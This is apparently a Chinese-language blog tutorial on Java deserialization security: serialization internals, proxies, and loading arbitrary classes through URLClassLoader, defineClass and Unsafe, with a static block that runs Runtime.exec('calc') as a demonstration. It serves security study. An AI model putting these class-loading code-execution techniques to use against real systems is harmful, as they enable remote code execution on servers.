<h4 id="java原生序列化"><a href="#java原生序列化" class="headerlink" title="java原生序列化"></a>java原生序列化</h4><p>先通过简单的代码来了解java反序列化的流程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;张三&quot;</span>, <span class="number">29</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(filename));</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person=(Person)unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>transient标记的变量不参与反序列化</strong></p>
<p>Java反序列化的很多操作,是需要开发者深入参与的,所以你会发现大量的库会实现<code>readObject</code>,<code>writeObject</code>方法</p>
<h5 id="objectAnnotation是什么"><a href="#objectAnnotation是什么" class="headerlink" title="objectAnnotation是什么?"></a>objectAnnotation是什么?</h5><p>在执行完默认的 <code>s.defaultWriteObject()</code> 后，向stream里写入了一个字符串 This is a object 。</p>
<p>然后在radObject中调用readObject()方法取出该字符串并打印</p>
<p>其实<code>writeObject</code>和<code>readObject</code>方法默认都支持重写,重写之后就不会执行到try catch了</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220323004013073.png" alt="image-20220323004013073"></p>
<p>它调用的<code>writeObjectOverride</code>方法这样描述</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220323004127574.png" alt="image-20220323004127574"></p>
<p>该方法就是给子类重写默认writeObject方法准备的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    Person(String name, <span class="keyword">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            IOException </span>&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        String message = (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;张三&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        ByteArrayOutputStream buf=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream= <span class="keyword">new</span> ObjectOutputStream(buf);</span><br><span class="line">        objectOutputStream.writeObject(person);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(buf.toByteArray()));</span><br><span class="line">        person=(Person) objectInputStream.readObject();</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/serializeDu.png" alt="serializeDu"></p>
<p>可以在objectAnnotation中看到 This is a object</p>
<h5 id="classAnnotations是什么？"><a href="#classAnnotations是什么？" class="headerlink" title="classAnnotations是什么？"></a>classAnnotations是什么？</h5><p><code>ObjectOutputStream</code>类中有一个方法<code>annotateClass</code>方法,<code>ObjectOutputStream</code>的子类需要向序列化后的数据里放任何内容,都可以重写这个方法,写入自己想要写入的数据,然后反序列化的时候就可以读取到这个信息并使用</p>
<p>比如，RMI的 类 <code>MarshalOutputStream</code> 就将当前的 <code>codebase</code> 写入</p>
<p>所以在分析序列化数据的时候看到<code>classAnnotations</code>,实际上就是<code>annotateClass</code>方法写入的内容</p>
<p>有些快递打包和拆包有特殊需求,比如易碎朝上,类比重写writeObject和readObject</p>
<p>使用<code>SerializationDumper</code>需要的是16进制字符串</p>
<h5 id="16进制字符串和byte相互转换"><a href="#16进制字符串和byte相互转换" class="headerlink" title="16进制字符串和byte相互转换"></a>16进制字符串和byte相互转换</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Convert byte[] to hex string.这里我们可以将byte转换成int，然后利用Integer.toHexString(int)来转换成16进制字符串。</span></span><br><span class="line"><span class="comment"> * @param src byte[] data</span></span><br><span class="line"><span class="comment"> * @return hex string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] src)</span></span>&#123;</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (src == <span class="keyword">null</span> || src.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; src.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = src[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        String hv = Integer.toHexString(v);</span><br><span class="line">        <span class="keyword">if</span> (hv.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            stringBuilder.append(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuilder.append(hv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Convert hex string to byte[]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> hexString the hex string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> byte[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String hexString) &#123;</span><br><span class="line">    <span class="keyword">if</span> (hexString == <span class="keyword">null</span> || hexString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hexString = hexString.toUpperCase();</span><br><span class="line">    <span class="keyword">int</span> length = hexString.length() / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">char</span>[] hexChars = hexString.toCharArray();</span><br><span class="line">    <span class="keyword">byte</span>[] d = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> pos = i * <span class="number">2</span>;</span><br><span class="line">        d[i] = (<span class="keyword">byte</span>) (charToByte(hexChars[pos]) &lt;&lt; <span class="number">4</span> | charToByte(hexChars[pos + <span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h5 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题?"></a>为什么会产生安全问题?</h5><p>只要服务器端反序列化数据,客户端传递类的readObject中代码会自动执行,给予攻击者在服务器上运行代码的能力</p>
<p>可能的形式</p>
<p>1.入口类的readObject直接调用危险方法</p>
<p>2.入口类参数中包含可控类,该类有危险方法,readObject时调用</p>
<p>入口A HashMap 接收参数O</p>
<p>3.入口类参数中包含可控类,该类又调用其他有危险方法的类,readObject时调用</p>
<p>4.构造函数/静态代码块等类加载时隐式执行</p>
<p>直接在readObject进行攻击是不现实的,最好包一个类</p>
<p>共同条件    继承Serializeable</p>
<p>入口类 source (重写readObject   参数类型宽泛   最好jdk自带)   </p>
<p>调用链  </p>
<p>反射在序列化中的应用</p>
<p>定制需要的对象</p>
<p>通过invoke调用除了同名函数以外的函数</p>
<p>通过Class类创建对象,引入不能序列化的类</p>
<h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220307121128637.png" alt="image-20220307121128637"></p>
<h5 id="代理模式优点"><a href="#代理模式优点" class="headerlink" title="代理模式优点"></a>代理模式优点</h5><ul>
<li>职责清晰</li>
<li>高扩展，只要实现了接口，都可以用代理。</li>
<li>智能化，动态代理。</li>
</ul>
<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>个人理解:<strong>静态代理就是两个实现了同一个接口的类,其中一个类当被代理类,另一个类中实现实例化被代理的类,并在其同名方法中增加自己的个性化内容,必须”收中介费”</strong>,代理类也可以有多个,必须二手房产可以有不同的品牌</p>
<p>以知乎上租房子的例子为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRentHouse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouse</span> <span class="keyword">implements</span> <span class="title">IRentHouse</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">---------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouseProxy</span> <span class="keyword">implements</span> <span class="title">IRentHouse</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IRentHouse rentHouse;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RentHouseProxy</span><span class="params">(IRentHouse rentHouse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rentHouse = rentHouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rentHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;交中介费&quot;</span>);</span><br><span class="line">        rentHouse.rentHouse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RentHouse rentHouse=<span class="keyword">new</span> RentHouse();</span><br><span class="line">        RentHouseProxy rentHouseProxy=<span class="keyword">new</span> RentHouseProxy(rentHouse);</span><br><span class="line"></span><br><span class="line">        rentHouseProxy.rentHouse();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后结果是:</span><br><span class="line">交中介费</span><br><span class="line">租房子</span><br></pre></td></tr></table></figure>

<h5 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h5><p>方便实现</p>
<p>但是当目标类增加了,代理类可能也需要成倍的增加,代理类数量过多,接口增加一个方法,所有实现类都需要增加重写方法</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p><strong>在程序执行过程中,使用jdk的反射机制,创建代理类对象</strong>,并动态的指定要代理目标类,换句话说,动态类是一种创建java对象的能力,帮调用者自动创建对象</p>
<p>动态代理的实现方式常用的有两种:</p>
<ul>
<li>使用jdk代理代理</li>
</ul>
<p>使用java反射包中的类和接口实现动态代理的功能,反射包 java.lang.reflect ,里面有三个类: InvocationHandler,Method,Proxy</p>
<ul>
<li>通过CGLIB动态代理</li>
</ul>
<p>cglib是第三方的工具库,创建代理对象,  cglib的原理是继承,     cglib通过继承目标类,创建它的子类,在子类中重写父类中同名的方法,实现功能的修改</p>
<p>要求目标类和方法不能是final的</p>
<p>动态代理则可以根据传递的方法而自动调用对应方法,类似于<code>反射</code>中的getMethod和invoke结合起来使用了</p>
<p>首先要定义一个InvocationHandler对象并实现InvocationHandler接口</p>
<p>InvocationHandler(调用处理器)接口,就一个方法invoke(),</p>
<p>​        invoke():表示代理对象要执行的功能代码,代理类要完成的功能就写在invoke()方法中</p>
<p>怎么使用?</p>
<ol>
<li>创建类实现接口InvocationHandler</li>
<li>重写invoke()方法,把原来静态代理中代理类要完成的功能,写在这里</li>
</ol>
<p>Method类:表示方法的,确切的说就是目标类中的方法</p>
<p>作用:通过Method可以执行某个目标类的方法 method.invoke(目标对象,方法的参数),这个Invoke和InvocationHandler中的Invoke没有关系</p>
<p>Proxy类 :核心的对象,创建代理对象,之前创建对象都是new 类的构造方法,现在我们是使用Proxy类的方法,代理new的使用</p>
<p>方法:静态方法 newProxyInstance()</p>
<p>作用是:创建代理对象,等同于静态代理中的new RentHouseProxy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>

<p>参数:</p>
<ol>
<li>ClassLoader  loader类加载器,负责向内存中加载对象的,使用反射获取对象的ClassLoader类</li>
<li>Class&lt;?&gt;[] interfaces: 接口,目标对象实现的接口,也是反射获取的</li>
<li>InvocationHandler h :自己写的代理类要完成的功能</li>
</ol>
<p>返回值:            就是代理对象</p>
<p>实现动态代理的步骤:</p>
<ol>
<li>创建接口,定义目标类要完成的功能</li>
<li>创建目标类实现接口</li>
<li>创建InvocationHandler接口的实现类,在invoke方法中完成代理类的功能<ol>
<li>调用目标方法</li>
<li>增强功能</li>
</ol>
</li>
<li>使用Proxy类的静态方法    创建代理对象,并把返回值转为接口类型</li>
</ol>
<p>为什么能转换成接口类型,因为它代理的类实现了该接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RentHouseInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    IRentHouse rentHouse;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RentHouseInvocationHandler</span><span class="params">(IRentHouse rentHouse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rentHouse = rentHouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        method.invoke(rentHouse,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RentHouse rentHouse=<span class="keyword">new</span> RentHouse();</span><br><span class="line">        </span><br><span class="line">        RentHouseInvocationHandler rentHouseInvocationHandler = <span class="keyword">new</span> RentHouseInvocationHandler(rentHouse);</span><br><span class="line">        IRentHouse o = (IRentHouse)Proxy.newProxyInstance(rentHouse.getClass().getClassLoader(), rentHouse.getClass().getInterfaces(), rentHouseInvocationHandler);</span><br><span class="line">        o.rentHouse();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>动态代理在漏洞利用的用法,</p>
<p>如果某个类是动态代理类,里面调用传入类的f方法,那么就可以传入B从而调用B的f方法</p>
<p>readObject-&gt;反序列化自动执行</p>
<p>invoke-&gt;有函数调用</p>
<h4 id="动态类加载方法"><a href="#动态类加载方法" class="headerlink" title="动态类加载方法"></a>动态类加载方法</h4><p>Class.forName    可以设置是否初始化</p>
<p>ClassLoader.loadClass不进行初始化</p>
<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
<p>loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p>
<h3 id="任意类加载"><a href="#任意类加载" class="headerlink" title="任意类加载"></a>任意类加载</h3><p>URLClassLoader </p>
<p>ClassLoader.defineClass 字节码加载类</p>
<p>Unsafe.defineClass 字节码加载    :Spring中有一个可以直接生成的方法</p>
<h4 id="URLClassLoader-file-http-jar"><a href="#URLClassLoader-file-http-jar" class="headerlink" title="URLClassLoader : file http  jar"></a>URLClassLoader : file http  jar</h4><p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///C:\\Temp\\classes\\&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Object o = test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="jar协议"><a href="#jar协议" class="headerlink" title="jar协议"></a>jar协议</h5><p>jar协议中可以使用http,file</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar -cvf Test.jar .\Test.class   <span class="comment">//先编译成class文件再打包</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;jar:file:///C:\\Temp\\classes\\Test.jar!/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Object o = test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="DefineClass通过字节码加载类"><a href="#DefineClass通过字节码加载类" class="headerlink" title="DefineClass通过字节码加载类"></a>DefineClass通过字节码加载类</h4><p><strong>defineClass只是将字节码转换为Class,而不会主动加载类,需要再次实例化,才能调用到静态代码块</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Temp\\classes\\Test.class&quot;</span>));</span><br><span class="line">        Class o= (Class)defineClass.invoke(systemClassLoader, <span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        o.newInstance();</span><br></pre></td></tr></table></figure>

<h4 id="loadClass-findClass-defineClass区别"><a href="#loadClass-findClass-defineClass区别" class="headerlink" title="loadClass,findClass,defineClass区别"></a>loadClass,findClass,defineClass区别</h4><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><ul>
<li><p>findLoadedClass(String) 调用这个方法，查看这个Class是否已经被加载</p>
</li>
<li><p>如果没有被加载，继续往下走，查看父类加载器，递归调用loadClass()</p>
</li>
<li><p>如果父类加载器是null，说明是启动类加载器，查找对应的Class</p>
</li>
<li><p>如果都没有找到，就调用findClass(String)</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass()"></a>findClass()</h5><ul>
<li>根据名称或位置加载.class字节码,然后使用defineClass</li>
<li>通常由子类去实现</li>
</ul>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass()"></a>defineClass()</h5><ul>
<li>把字节码转化为Class</li>
</ul>
<h4 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a>Unsafe</h4><p>Unsafe类采用了单例模式设计,但是它其中也有defineClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        Field theUnsafe = unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Temp\\classes\\Test.class&quot;</span>));</span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        theUnsafe.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe=(Unsafe) theUnsafe.get(<span class="keyword">null</span>);</span><br><span class="line">        Class test=(Class) unsafe.defineClass(<span class="string">&quot;Test&quot;</span>,code,<span class="number">0</span>,code.length,systemClassLoader,<span class="keyword">null</span>);</span><br><span class="line">        test.newInstance();</span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>java题目</title>
    <url>/2022/03/26/java%E9%A2%98%E7%9B%AE/</url>
